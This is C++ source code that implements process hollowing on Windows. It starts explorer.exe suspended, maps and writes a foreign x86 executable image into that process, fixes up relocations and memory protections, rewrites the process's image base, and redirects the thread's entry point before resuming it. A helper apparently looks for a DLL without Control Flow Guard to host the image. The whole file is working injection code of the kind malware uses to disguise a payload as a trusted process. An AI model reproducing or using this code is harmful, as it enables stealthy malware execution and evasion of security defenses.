#include "stdafx.h"

NTSTATUS FindNoCfgDll(_In_ PVOID bWow, _In_ ULONG Machine, _In_ ULONG Magic, _In_ ULONG SizeOfImage, _Out_ PHANDLE SectionHandle);

void CopyImage(PVOID BaseAddress, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth, ULONG SizeOfHeaders)
{
	memcpy(BaseAddress, BaseOfImage, SizeOfHeaders);

	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (ULONG cb = min(pish->Misc.VirtualSize, pish->SizeOfRawData))
			{
				memcpy((PBYTE)BaseAddress + pish->VirtualAddress, (PBYTE)BaseOfImage + pish->PointerToRawData, cb);
			}
		} while (pish++, --NumberOfSections);
	}
}

void Relocate(PVOID BaseAddress, LONG_PTR RemoteBase)
{
	ULONG size;

	union {
		PVOID pv;
		PBYTE pb;
		PULONG_PTR pImageBase;
		PIMAGE_BASE_RELOCATION pibr;
	};

	LONG_PTR Delta = 0;

	pImageBase = &RtlImageNtHeader(BaseAddress)->OptionalHeader.ImageBase;
	Delta = RemoteBase - *pImageBase;
	*pImageBase = RemoteBase;

	if (pv = RtlImageDirectoryEntryToData(BaseAddress, TRUE, IMAGE_DIRECTORY_ENTRY_BASERELOC, &size))
	{
		ULONG SizeOfBlock;
		do 
		{
			SizeOfBlock = pibr->SizeOfBlock;

			pibr = LdrProcessRelocationBlock((PBYTE)BaseAddress + pibr->VirtualAddress, 
				(SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1, (PUSHORT)(pibr + 1), Delta);

		} while (size -= SizeOfBlock);
	}
}

NTSTATUS ProtectImage(HANDLE hProcess, PVOID RemoteBase, PIMAGE_NT_HEADERS pinth)
{
	if (ULONG NumberOfSections = pinth->FileHeader.NumberOfSections)
	{
		PIMAGE_SECTION_HEADER pish = IMAGE_FIRST_SECTION(pinth);

		do 
		{
			if (SIZE_T VirtualSize = pish->Misc.VirtualSize)
			{
				ULONG NewProtect = PAGE_NOACCESS;

				switch (pish->Characteristics & (IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ))
				{
				case IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READONLY;
					break;

				case IMAGE_SCN_MEM_EXECUTE:
					NewProtect = PAGE_EXECUTE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READ;
					break;

				case IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_READWRITE;
					break;

				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE:
				case IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE|IMAGE_SCN_MEM_READ:
					NewProtect = PAGE_EXECUTE_READWRITE;
					break;
				}

				PVOID BaseAddress = (PBYTE)RemoteBase + pish->VirtualAddress;
				NTSTATUS status = ZwProtectVirtualMemory(hProcess, &BaseAddress, &VirtualSize, NewProtect, &NewProtect);
				if (0 > status)
				{
					return status;
				}
			}
		} while (pish++, --NumberOfSections);
	}

	return STATUS_SUCCESS;
}

//#define _PRINT_CPP_NAMES_
#include "../ScEntry/asmfunc.h"

PCWSTR explorer()ASM_FUNCTION;

// for x86 image
BOOL Exec(_In_ PVOID Wow, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth, PCWSTR lpCmdLine = 0)
{
	if (IMAGE_NT_OPTIONAL_HDR32_MAGIC != pinth->OptionalHeader.Magic ||
		IMAGE_FILE_MACHINE_I386 != pinth->FileHeader.Machine)
	{
		return FALSE;
	}

	ULONG SizeOfImage = pinth->OptionalHeader.SizeOfImage;
	ULONG SizeOfHeaders = pinth->OptionalHeader.SizeOfHeaders;
	CONTEXT ctx {};
	ctx.ContextFlags = CONTEXT_INTEGER;

	BOOL fOk = FALSE;
	HANDLE hSection;

	if (0 <= FindNoCfgDll(Wow, IMAGE_FILE_MACHINE_I386, IMAGE_NT_OPTIONAL_HDR32_MAGIC, SizeOfImage, &hSection))
	{
		SIZE_T ViewSize = 0;
		PVOID BaseAddress = 0;

		if (0 <= ZwMapViewOfSection(hSection, NtCurrentProcess(), 
			&BaseAddress, 0, 0, 0, &ViewSize, ViewUnmap, 0, PAGE_NOACCESS))
		{
			ULONG op;
			PVOID pv = BaseAddress;
			SIZE_T RegionSize = SizeOfImage;

			if (0 <= ZwProtectVirtualMemory(NtCurrentProcess(), &pv, &RegionSize, PAGE_READWRITE, &op))
			{
				RtlZeroMemory(BaseAddress, SizeOfImage);

				CopyImage(BaseAddress, BaseOfImage, pinth, SizeOfHeaders);

				ULONG cch;
				WCHAR buf[MAX_PATH];

				if (Wow)
				{
					cch = GetSystemWow64DirectoryW(buf, _countof(buf) - 16);
				}
				else
				{
					cch = GetSystemWindowsDirectoryW(buf, _countof(buf) - 16);
				}

				if (cch)
				{
					wcscpy(buf + cch, explorer());
				}

				STARTUPINFO si = { sizeof(si) };
				PROCESS_INFORMATION pi;

				if (CreateProcessW(buf, const_cast<PWSTR>(lpCmdLine), 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
				{
					PROCESS_BASIC_INFORMATION pbi;

					PVOID RemoteBase = 0;
					ViewSize = SizeOfImage;

					if (0 <= NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), 0) &&
						0 <= ZwGetContextThread(pi.hThread, &ctx) &&
						0 <= ZwMapViewOfSection(hSection, pi.hProcess, &RemoteBase, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_READONLY))
					{
						Relocate(BaseAddress, (LONG_PTR)RemoteBase);
						
						ctx.Eax = (ULONG_PTR)RemoteBase + pinth->OptionalHeader.AddressOfEntryPoint;

						fOk = 0 <= ZwProtectVirtualMemory(pi.hProcess, &(pv = RemoteBase), &(RegionSize = SizeOfImage), PAGE_READWRITE, &op) &&
							0 <= ZwWriteVirtualMemory(pi.hProcess, RemoteBase, BaseAddress, SizeOfImage, 0) &&
							0 <= ProtectImage(pi.hProcess, RemoteBase, pinth) &&
							0 <= ZwWriteVirtualMemory(pi.hProcess, &reinterpret_cast<PEB*>(pbi.PebBaseAddress)->ImageBaseAddress, &RemoteBase, sizeof(RemoteBase), 0) &&
							0 <= ZwSetContextThread(pi.hThread, &ctx) &&
							0 <= ZwResumeThread(pi.hThread, 0);
					}

					if (!fOk)
					{
						TerminateProcess(pi.hProcess, 0);
					}

					NtClose(pi.hThread);
					NtClose(pi.hProcess);
				}
			}
			ZwUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
		}

		NtClose(hSection);
	}

	return fOk;
}
